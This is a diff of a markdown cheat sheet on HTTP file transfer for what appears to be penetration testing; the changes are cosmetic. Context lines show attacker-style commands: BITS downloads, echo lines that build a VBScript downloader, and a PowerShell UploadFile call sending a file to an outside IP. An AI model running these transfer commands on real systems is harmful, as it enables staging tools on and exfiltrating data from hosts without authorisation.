@@ -1,4 +1,4 @@
-# HTTP
+# ⭕ HTTP
 
 #### Linux
 
@@ -25,8 +25,6 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-
-
 
 ## Linux HTTP Server
 
@@ -106,7 +104,6 @@ or
 #### run these commands in order to create a vbscrtipt for downloading a file
 
 ```
-
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
@@ -167,4 +164,3 @@ C:\Users> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.
 #### python script
 
 [https://gist.github.com/UniIsland/3346170](https://gist.github.com/UniIsland/3346170)
-
